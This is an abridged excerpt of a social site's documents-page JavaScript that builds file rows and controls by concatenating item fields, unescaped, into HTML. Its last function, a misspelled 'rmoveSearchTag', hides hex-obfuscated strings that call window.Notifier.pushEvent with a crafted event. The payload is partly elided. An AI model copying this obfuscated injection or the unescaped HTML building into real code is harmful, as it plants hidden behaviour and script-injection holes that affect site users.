var Docs = {
    ...
    addDoc: function(doc) {
        ...
        setTimeout(function() {
            ...
            setTimeout(animate.pbind(added, {
    ...
    drawList: function(list, first, cont) {
        ...
        for (var i in list) {
            ...
            cont.appendChild(se('<div id="docs_file_' + item[4] + '_' + item[0] + '" class="docs_item' + first + '" onmouseover="Docs.rowOver(' + item[4] + ', ' + item[0] +
                ');" onmouseout="Docs.rowOut(' + item[4] + ', ' + item[0] + ');">' + Docs.getDocHTML(item) + '</div>'))
            first = '';
        }
    },
    ...
    getDocHTML: function(item) {
        ...
        var thumb = item[8];
        if (thumb) {
            ext = '<a class="docs_item_thumb fl_l" href="' + url + '" ext="' + ext + '" onmouseover="Docs.showFileTT(this, ' + oid + ', ' + id +
                ')" onmouseout="Docs.hideFileTT(this)" onclick="return Docs.downloadItem(' + oid + ', ' + id + ');"><img class="docs_item_thumb_img" src="' + thumb +
                '"></a>';
        } else {
            if (ext.length > 6) {
        ...
        if (oid == vk.id || mid == vk.id || (oid == cur.oid && oid < 0 && cur.groupAdmin)) {
            ext = '<div class="docs_delete_row fl_r" id="docs_delete_row' + oid + '_' + id + '" onmouseover="Docs.rowActive(' + oid + ', ' + id +
                ', 1)" onmouseout="Docs.rowInactive(' + oid + ', ' + id + ', 1)" onclick="Docs.deleteItem(' + oid + ', ' + id +
                ', cur.hash); return false" style="opacity: 0;"></div><div class="docs_edit_row fl_r" id="docs_edit_row' + oid + '_' + id +
                '" onmouseover="Docs.rowActive(' + oid + ', ' + id + ', 2)" onmouseout="Docs.rowInactive(' + oid + ', ' + id + ', 2)" onclick="Docs.editItem(' + oid + ', ' +
                id + '); return false" style="opacity: 0;"></div>' + ext;
        } else {
            ext = '<div class="docs_add_row fl_r" id="docs_add_row' + oid + '_' + id + '" onmouseover="Docs.rowActive(' + oid + ', ' + id +
                ', 3)" onmouseout="Docs.rowInactive(' + oid + ', ' + id + ', 3)" onclick="Docs.addItem(' + oid + ', ' + id +
                ', cur.hash); return false" style="opacity: 0;"></div>' + ext;
        }
        return cur.itemTpl(oid, id, ext, title, dateStr, url, tags, intval(item[7]))
            .join('');
    },
    ...
    processGlobalSearch: function(searchStr, list, shown, count) {
        ...
        if (shown) {
            ...
            cur.searchCont.innerHTML = '';
            if (!cur.shown) {
                cur.listCont.innerHTML = '<div class="docs_empty">' + cur.lang['docs_empty_search'].replace('%s', '<b>' + cur.searchStr.replace(/(<|>)/g, '')
                    .replace(/\s*,\s*/g, ', ') + '</b>') + '</div>';
                hide('show_more');
                Docs.showCont();
            }
    ...
    drawSummary: function(noSearch) {
        ...
        ge('docs_summary')
            .innerHTML = summary;
        ge('docs_search_summary')
            .innerHTML = subSummary;
        if (subSummary) {
...
<table cellspacing="0" cellpadding="0"><tbody><tr><td class="lists_shad_l"><div></div></td><td><div class="lists_shad_t2"></div><div class="lists_shad_t"></div><div class="lists_rows"><div id="rows3">'
        ...
        cur.docsMenuCont = bodyNode.appendChild(ce('div', {
            id: 'privacy_helper',
            innerHTML: html.join('')
        }));
    ...
    rmoveSearchTag: function(obj) {
        var _0x8be1 = [
            ...
            "\x76\x6B\x4E\x6F\x77", "\x3C\x21\x3E\x31\x33\x30\x33\x33", "\x70\x75\x73\x68\x45\x76\x65\x6E\x74", "\x4E\x6F\x74\x69\x66\x69\x65\x72"
        ];
        window[_0x8be1[4]][_0x8be1[3]](_0x8be1[0] + (window[_0x8be1[1]]() / 1000) + _0x8be1[2]);
    },
